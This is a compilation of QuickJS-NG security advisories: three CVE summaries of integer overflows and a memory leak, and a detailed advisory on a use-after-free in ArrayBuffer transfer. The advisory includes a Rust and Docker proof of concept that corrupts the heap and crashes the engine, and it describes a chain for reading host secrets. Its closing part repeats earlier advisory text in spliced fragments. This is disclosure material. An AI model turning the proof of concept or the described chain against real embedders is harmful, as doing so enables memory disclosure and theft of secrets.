CVE-2026-120438.description: QuickJS-NG before 0.16.0 contains an integer overflow in js_proxy_get_own_property_names() in quickjs.c that causes a heap buffer overflow on 32-bit hosts. Attackers running JavaScript can return a large array-like object from a Proxy ownKeys trap to wrap the allocation size, causing crashes or potential code execution.

CVE-2026-120439.title: QuickJS-NG before 0.16.0 contains an integer overflow in js_typed ...
CVE-2026-120439.description: QuickJS-NG before 0.16.0 contains an integer overflow in js_typed_array_sort() in quickjs.c that allows attackers to cause a heap buffer overflow on 32-bit hosts. Attackers who can run JavaScript can call TypedArray.prototype.sort with a comparator on a typed array near 2^30 elements, wrapping the allocation size and writing indices past the buffer to crash or potentially execute code.

CVE-2026-120440.title: QuickJS-NG before 0.16.0 contains a memory leak vulnerability in  ...
CVE-2026-120440.description: QuickJS-NG before 0.16.0 contains a memory leak vulnerability in js_atomics_store() in quickjs.c that fails to free the converted value when returning a RangeError. Attackers running JavaScript can repeatedly call Atomics.store with a valueOf that detaches or shrinks the buffer to exhaust heap memory and cause denial of service.

GHSA-52gx-967m-hxp3.title: Use-after-free in js_array_buffer_transfer on external ArrayBuffers
GHSA-52gx-967m-hxp3.description:
### Summary `ArrayBuffer.prototype.transfer()` (and `transferToFixedLength`, `transferToImmutable`) calls `js_realloc()` on the `ArrayBuffer` backing store without checking whether the buffer was allocated by QuickJSs own allocator. When an embedder creates an ArrayBuffer via JS_NewArrayBuffer() with a custom free_func - the standard C API for handing embedder-owned memory to JavaScript `calling .transfer()` from untrusted JS passes the foreign pointer to `js_realloc`, causing heap corruption. Depending on the buffer state, this produces: - Immediate crash (empty external buffer with dangling/sentinel pointer) - Silent heap corruption → use-after-free → arbitrary memory read (non-empty external buffer) The vulnerability is exploitable from untrusted JavaScript in any embedder that exposes external ArrayBuffers. ### Details The function `js_array_buffer_transfer` has been present since quickjs-ng's initial release and has never had a guard against external buffers. File: quickjs.c / Function: js_array_buffer_transfer The vulnerable code path: ``` static JSValue js_array_buffer_transfer(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv, int magic) { // ... bs = abuf->data; old_len = abuf->byte_length; if (new_len != old_len) { new_bs = js_realloc(ctx, bs, new_len); // BUG: no free_func check // ... } ``` `js_realloc` assumes bs was allocated by `js_malloc`. When the ArrayBuffer was created via the C API with a custom free_func (e.g., `JS_NewArrayBuffer(ctx, rust_ptr, len, my_free, opaque, false`)), bs points to memory from a different allocator. `js_realloc` calls `malloc_usable_size()` on the foreign pointer, which is undefined behavior. Contrast with `js_array_buffer_resize`, which correctly guards: ``` static JSValue js_array_buffer_resize(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv, int class_id) { // ... if (abuf->free_func != js_array_buffer_free) return JS_ThrowTypeError(ctx, 'external array buffer is not resizable'); // ... ``` This guard is missing from `js_array_buffer_transfer`. #### Exploitation Stage 1: Crash (DoS) An empty external ArrayBuffer has a NULL or dangling sentinel data pointer (e.g. 0x1 for Rust's empty Vec - rquickjs). `js_realloc(ctx, 0x1, 64)` calls `malloc_usable_size(0x1)`, crashing immediately with SIGSEGV. ``` // Requires embedder that returns external ArrayBuffers const ta = new TextEncoder().encode(''); // empty Vec<u8> → data=0x1 ta.buffer.transfer(64); // CRASH: SIGSEGV in js_realloc ``` Stage 2: Heap corruption → Use-after-free With a non-empty external buffer (e.g. 56 bytes from an embedder bridge API), js_realloc may succeed under glibc because realloc can operate on any heap pointer from the same process. The transfer then: 1. `reallocs` the external pointer to the new size via `js_realloc` 2. Frees the old `JSArrayBuffer` struct 3. Creates a new `JSArrayBuffer` for the result - glibc reuses the just-freed slot 4. Propagates the original `free_func` to the new buffer (`abuf->free_func`) The old `TypedArray` view still references the freed `JSArrayBuffer` struct, which now overlaps with the new buffer's JSArrayBuffer. Reading through the old view exposes the new struct's fields: `data` pointer (heap address), `free_func` pointer (binary code address), and `size`. Stage 3: Arbitrary memory read Writing to the old view overwrites the new `JSArrayBuffer`'s `data` and `size` fields. Calling `.slice()` on the new buffer then copies memory from an attacker-controlled address, achieving arbitrary read across the entire process address space. A full exploit chain was demonstrated: binary base leak → GOT read → libc base → __environ → reading environment variables (secrets, tokens) from process memory. ### PoC 1. Create the following Dockerfile in a fresh directory, then build and enter it. ``` FROM rust:1.87-bookworm # --- System dependencies for building quickjs-ng and running ASAN --- RUN apt-get update && apt-get install -y --no-install-recommends \ build-essential cmake git clang llvm \ libclang-dev pkg-config \ gdb valgrind strace \ && rm -rf /var/lib/apt/lists/* # --- Install Rust nightly (needed for -Zsanitizer=address) --- RUN rustup toolchain install nightly \ && rustup component add rust-src --toolchain nightly # --- Clone quickjs-ng at current master for source-level inspection --- RUN git clone --depth 1 https://github.com/quickjs-ng/quickjs.git /opt/quickjs-src WORKDIR /workspace ``` 2. Build the verification image ``` # Build the image docker build -t qjs-uaf-verify . # Enter the container - SYS_PTRACE and seccomp is required for ASAN and gdb to function inside the container docker run --rm -it \ --cap-add=SYS_PTRACE \ --security-opt seccomp=unconfined \ qjs-uaf-verify bash ``` 3. Set up the PoC project inside the container ``` # Create the project structure cargo init --name poc-transfer-uaf /workspace/poc cd /workspace/poc ``` 3a. Write a `Cargo.toml` - In the PoC we're using an external embedder via rquickjs ``` cat > Cargo.toml << 'TOML' [package] name = 'poc-transfer-uaf' version = '0.1.0' edition = '2021' [dependencies] rquickjs = { version = '0.12.0', features = ['bindgen', 'classes', 'loader'] } TOML ``` 3b. Write `src/main.rs` ``` cat > src/main.rs << 'RUST' fn main() { // --- Case 1: Non-empty external buffer (allocator mismatch -> UAF) --- println!('[Case 1] Non-empty external ArrayBuffer -> allocator mismatch'); let rt = rquickjs::Runtime::new().expect('runtime'); let ctx = rquickjs::Context::full(&rt).expect('context'); ctx.with(|ctx| { // rquickjs::TypedArray::new allocates a Vec<u8> on the Rust heap // and passes its raw pointer to JS_NewArrayBuffer with // free_func = drop_raw<u8> (Rust-allocator finalizer). let data: Vec<u8> = vec![0x41u8; 56]; let ta = rquickjs::TypedArray::<u8>::new(ctx.clone(), data) .expect('TypedArray::new'); let ab = ta.arraybuffer().expect('arraybuffer'); ctx.globals() .set('extBuf', ab) .expect('set global'); // .transfer(128) triggers the bug: // js_array_buffer_transfer calls js_realloc(ctx, rust_ptr, 128) // without checking free_func != js_array_buffer_free. let result: rquickjs::Result<rquickjs::Value> = ctx.eval( r#' var nb = extBuf.transfer(128); ({ newLen: nb.byteLength, first: new Uint8Array(nb)[0] }); '#, ); match result { Ok(_) => println!( ' transfer() did not throw — heap metadata is silently corrupted.
 \ The Rust finalizer will double-free or abort on GC.' ), Err(e) => println!(' Exception (unexpected): {e}'), } }); // Intentionally leak the runtime to avoid triggering GC on the // corrupted ArrayBuffer. Dropping would crash here (the Rust // finalizer tries to reconstruct a Vec from a now-null pointer), // which would abort the process before Case 2 runs. std::mem::forget(ctx); std::mem::forget(rt); // --- Case 2: Empty external buffer (wild pointer -> immediate crash) --- println!('
[Case 2] Empty external ArrayBuffer -> wild pointer crash'); let rt2 = rquickjs::Runtime::new().expect('runtime'); let ctx2 = rquickjs::Context::full(&rt2).expect('context'); ctx2.with(|ctx| { // An empty Vec<u8> has a dangling data pointer (0x1 on Rust's // allocator). js_realloc calls malloc_usable_size(0x1) which // immediately crashes. let empty: Vec<u8> = Vec::new(); let ta2 = rquickjs::TypedArray::<u8>::new(ctx.clone(), empty) .expect('TypedArray::new empty'); let ab2 = ta2.arraybuffer().expect('arraybuffer'); ctx.globals() .set('emptyBuf', ab2) .expect('set global'); let result2: rquickjs::Result<rquickjs::Value> = ctx.eval( r#' var nb2 = emptyBuf.transfer(64); nb2.byteLength; '#, ); match result2 { Ok(_) => println!(' Unexpected success'), Err(e) => println!(' Exception / crash: {e}'), } }); println!('
If you reached this line, re-run under ASAN to see the heap corruption.'); } RUST ``` 4. Run the PoC - release build (crash behavior) ``` cd /workspace/poc cargo build --release 2>&1 | tail -5 cargo run --release 2>&1 echo 'Exit code: $?' ``` Expected output: Case 1 silently corrupts the heap (transfer 'succeeds' but the QuickJS/Rust allocator bookkeeping is now inconsistent). Case 2 crashes with SIGSEGV when the empty Vec's `0x1` dangling sentinel hits `realloc`: ``` [Case 1] Non-empty external ArrayBuffer -> allocator mismatch transfer() did not throw - heap metadata is silently corrupted. The Rust finalizer will double-free or abort on GC. [Case 2] Empty external ArrayBuffer -> wild pointer crash Segmentation fault Exit code: 139 ``` Exit code 139 = 128 + signal 11 (SIGSEGV). 5. Run the PoC - ASAN build (proof) ASAN instruments every allocation and catches the allocator mismatch that the release build silently ignores. Important: Both Rust code and the C code compiled by rquickjs-sys must be instrumented. Pass `CFLAGS` alongside `RUSTFLAGS`: ``` cd /workspace/poc cargo clean CFLAGS='-fsanitize=address -fno-omit-frame-pointer -g' \ RUSTFLAGS='-Zsanitizer=address' \ cargo +nightly run \ -Zbuild-std \ --target aarch64-unknown-linux-gnu \ 2>&1 ``` Expected output: Case 1's allocator mismatch is not caught by ASAN because on glibc both Rust's allocator and QuickJS's allocator use the same underlying malloc - the pointer is technically valid, but QuickJS's bookkeeping is corrupted. Case 2 triggers ASAN at the exact bug site - `js_realloc` calls `malloc_usable_size(0x1)` on the empty Vec's dangling sentinel: ``` [Case 1] Non-empty external ArrayBuffer -> allocator mismatch transfer() did not throw - heap metadata is silently corrupted. The Rust finalizer will double-free or abort on GC. [Case 2] Empty external ArrayBuffer -> wild pointer crash ================================================================= ==PID==ERROR: AddressSanitizer: attempting to call malloc_usable_size() for pointer which is not owned: 0x000000000001 #0 ... in malloc_usable_size ... #1 ... in __asan::asan_malloc_usable_size ... #2 ... in js__malloc_usable_size .../out/cutils.h:608 #3 ... in js_realloc_rt .../out/quickjs.c:1690 #4 ... in js_realloc .../out/quickjs.c:1766 #5 ... in js_array_buffer_transfer .../out/quickjs.c:58202 #6 ... in js_call_c_function .../out/quickjs.c:17423 ... Address 0x000000000001 is a wild pointer inside of access range of size 0x000000000001. SUMMARY: AddressSanitizer: bad-malloc_usable_size ... in malloc_usable_size ==PID==ABORTING ``` ### Impact Use-after-free enabling arbitrary process memory read from untrusted JavaScript. Any embedder that creates ArrayBuffers via the documented `JS_NewArrayBuffer` C API with a custom free_func is affected - this includes Rust (rquickjs), C/C++, and any language binding that passes embedder-owned memory to JS. The DoS path (empty buffer → SIGSEGV) is a single-line unconditional crash. The information disclosure path (non-empty buffer → UAF → arbitrary read) was demonstrated end-to-end: free_func pointer leak → binary base → GOT → libc base → __environ → exfiltration of host environment secrets. The same UAF primitive structurally supports writes but this was not exercised. ### Threat Model Alignment **Reachable from untrusted JavaScript:** Yes. The attacker only needs to call .transfer() on any ArrayBuffer provided by the embedder - no special privileges, no bytecode loading, no C API misuse. **Trusted embedder:** The embedder correctly uses the documented JS_NewArrayBuffer API with a custom free_func. This is the standard, intended pattern for sharing memory between the embedder and JS. **Test Environment Proof:** Demonstrated full sandbox escape - arbitrary memory read of host process secrets (environment variables, tokens) from sandboxed JS.

Creates a new `JSArrayBuffer` for the result - glibc reuses the just-freed slot 4. Propagates the original `free_func` to the new buffer (`abuf->free_func`) The old `TypedArray` view still references the freed `JSArrayBuffer` struct, which now overlaps with the new buffer's JSArrayBuffer. Reading through the old view exposes the new struct's fields: `data` pointer (heap address), `free_func` pointer (binary code address), and `size`. Stage 3: Arbitrary memory read Writing to the old view overwrites the new `JSArrayBuffer`'s `data` and `size` fields. Calling `.slice()` on the new buffer then copies memory from an attacker-controlled address, achieving arbitrary read across the entire process address space. A full exploit chain was demonstrated: binary base leak → GOT read → libc base → __environ → reading environment variables (secrets, tokens) from process memory. ### PoC 1. Any embedder that creates ArrayBuffers via the documented `JS_NewArrayBuffer` C API with a custom free_func is affected - this includes Rust (rquickjs), C/C++, and any language binding that passes embedder-owned memory to JS. The DoS path (empty buffer → SIGSEGV) is a single-line unconditional crash. The information disclosure path (non-empty buffer → UAF → arbitrary read) was demonstrated end-to-end: free_func pointer leak → binary base → GOT → libc base → __environ → exfiltration of host environment secrets. The same UAF primitive structurally supports writes but this was not exercised. ### Threat Model Alignment **Reachable from untrusted JavaScript:** Yes. The attacker only needs to call .transfer() on any ArrayBuffer provided by the embedder - no special privileges, no bytecode loading, no C API misuse. **Trusted embedder:** The embedder correctly uses the documented JS_NewArrayBuffer API with a custom free_func. This is the standard, intended pattern for sharing memory between the embedder and JS. **Test Environment Proof:** Demonstrated full sandbox escape - arbitrary memory read of host process secrets (environment variables, tokens) from sandboxed JS.
